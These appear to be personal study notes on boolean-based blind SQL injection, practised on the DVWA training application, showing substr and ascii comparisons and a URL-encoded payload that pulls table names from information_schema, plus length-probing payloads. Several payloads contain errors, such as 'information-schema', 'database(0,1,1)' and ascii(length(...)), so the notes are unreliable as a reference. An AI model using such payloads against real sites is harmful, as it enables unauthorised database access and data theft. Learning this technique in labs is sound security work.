Blind SQLI
====

Blind detection
Sql injection trigger on sqlserver.

sql queuery ask the database true and false conditions and determine response based on  application  responses.  It generates the specific msg like if the value exist in database return the msg A from the specified code other wise return with block of code B. 

After that by balancing the right and left side of queer, by ‘,” or by ‘),’) depending on the string mentioned at back end…..

Functions:-
Substr(“function”,position, character)
substr(database(),1,1) 
 
Extract substring from the string.

Ascii:-
Converts the char value to ascii value…..it converts subsets extract value to ascii value.

ascii(substr(database(),2,1)) 
It implies that extract 1 character from the 2nd position of database() and convert it into ascii value.
Further which is detect by matching it with ascii table using <,> symbols.
E.g
90<ascii(substr(database(),1,1))
Msg;- value exist or the true condition
110<ascii(substr(database(),1,1))
Msg:- value not exist or false condition.
100=ascii(substr(database(0,1,1))
Value exist
Which is equal to [d] in ascii table table……

	dvwa/vulnerabilities/sqli_blind/?id=1%27%20and%20110%3Cascii(substr((SELECT%20table_name%20from%20information-schema.tables%20where%20table_schema=database()%20limit%201,1),2,1))--%20-



>>>   payload to identifies the length of database, table name , user() etc.

And ascii(length(database()))>100			this let us know the length of database

And ascii(length(user()))>110    this let us know the user length

This way we can identifies the length.
